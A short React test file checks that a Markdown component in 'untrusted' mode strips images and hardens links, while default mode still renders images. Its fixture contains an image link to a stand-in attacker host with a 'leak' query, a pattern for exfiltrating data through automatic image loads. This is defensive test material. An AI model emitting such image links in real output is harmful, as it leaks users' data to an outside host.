import React from "react";
import { describe, expect, it } from "vitest";
import { render, screen } from "@testing-library/react";
import { Markdown } from "./Markdown";

const md = "![x](https://attacker.example/?leak)\n\n[link](https://example.com)";

describe("Markdown", () => {
  it("untrusted: renders no <img> and links carry rel/target", () => {
    const { container } = render(<Markdown untrusted>{md}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    const a = screen.getByRole("link", { name: "link" });
    expect(a).toHaveAttribute("rel", "noopener noreferrer");
    expect(a).toHaveAttribute("target", "_blank");
  });

  it("default: still renders images (other callers unchanged)", () => {
    const { container } = render(<Markdown>{md}</Markdown>);
    expect(container.querySelector("img")).not.toBeNull();
  });
});
